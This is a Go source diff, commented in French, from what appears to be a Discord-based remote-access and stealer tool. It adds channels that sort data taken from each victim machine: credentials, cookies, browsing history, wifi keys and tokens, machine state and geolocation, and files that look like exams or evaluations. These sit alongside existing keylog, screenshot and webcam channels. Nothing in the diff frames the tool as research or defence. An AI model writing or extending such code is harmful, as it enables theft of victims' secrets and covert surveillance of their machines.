@@ -285,6 +285,9 @@ func allChannelNames() []string {
 		host + "-keylogs",
 		host + "-screenshots",
 		host + "-webcam",
+		host + "-steal",
+		host + "-infos",
+		host + "-files-eval",
 		host + "-files-pdf",
 		host + "-files-images",
 		host + "-files-docs",
@@ -320,6 +323,45 @@ func channelsReport() string {
 			"il lui faut « Gérer les salons » sur le serveur.", ok, len(names)))
 	}
 	return b.String()
+}
+
+// stealChannel recoit les fichiers d extraction (identifiants, cookies,
+// historique, wifi, jetons). Aucun pave de texte : des fichiers, rien d autre.
+func stealChannel() string {
+	id, done := namedChannel(hostChannelName() + "-steal")
+	if id != "" {
+		return id
+	}
+	if done {
+		return targetChannel()
+	}
+	return ""
+}
+
+// infosChannel recoit l etat de la machine et la geolocalisation, separes du
+// salon de commande pour que celui-ci reste lisible.
+func infosChannel() string {
+	id, done := namedChannel(hostChannelName() + "-infos")
+	if id != "" {
+		return id
+	}
+	if done {
+		return targetChannel()
+	}
+	return ""
+}
+
+// evalChannel recoit les fichiers qui ressemblent a des evaluations : c est le
+// premier endroit a regarder.
+func evalChannel() string {
+	id, done := namedChannel(hostChannelName() + "-files-eval")
+	if id != "" {
+		return id
+	}
+	if done {
+		return targetChannel()
+	}
+	return ""
 }
 
 // screenshotsChannel renvoie le salon des captures d'écran
